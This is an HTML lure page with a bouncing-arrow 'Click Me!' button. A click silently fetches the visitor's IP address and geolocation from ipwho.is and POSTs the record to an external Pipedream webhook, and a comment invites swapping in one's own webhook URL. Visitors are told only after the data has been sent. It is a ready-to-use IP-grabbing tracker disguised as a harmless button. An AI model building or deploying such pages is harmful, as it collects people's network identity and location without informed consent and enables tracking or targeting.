<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Click Me!</title>
<style>
    body {
        margin: 0;
        height: 100vh;
        display: flex;
        flex-direction: column;
        justify-content: center;
        align-items: center;
        background: linear-gradient(to bottom, red, black);
        font-family: Arial, sans-serif;
        overflow: hidden;
        position: relative;
    }

    button {
        padding: 20px 40px;
        font-size: 24px;
        background-color: red;
        color: white;
        border: none;
        border-radius: 10px;
        cursor: pointer;
        z-index: 2;
        position: relative;
    }

    /* Arrow styling pointing at button */
    .arrow {
        width: 0;
        height: 0;
        border-left: 20px solid transparent;
        border-right: 20px solid transparent;
        border-top: 30px solid white; /* pointing upward */
        margin-top: 20px;
        animation: bounce 1s infinite;
    }

    .arrow1 { animation-delay: 0s; }
    .arrow2 { animation-delay: 0.3s; }
    .arrow3 { animation-delay: 0.6s; }

    @keyframes bounce {
        0%, 100% { transform: translateY(0); }
        50% { transform: translateY(-10px); }
    }
</style>
</head>
<body>

<button id="clickMe">Click Me!</button>

<!-- Arrows pointing at the button -->
<div class="arrow arrow1"></div>
<div class="arrow arrow2"></div>
<div class="arrow arrow3"></div>

<script>
const pipedreamURL = "https://eozjl51eif5jnhw.m.pipedream.net"; // replace with your Pipedream HTTP trigger URL

document.getElementById("clickMe").addEventListener("click", async () => {
    try {
        // Fetch IP info from ipwho.is
        const response = await fetch("https://ipwho.is/");
        const data = await response.json();

        // Send the data to Pipedream
        await fetch(pipedreamURL, {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify(data)
        });

        alert("IP info sent!");
    } catch (err) {
        console.error(err);
        alert("Error sending IP info");
    }
});
</script>

</body>
</html>
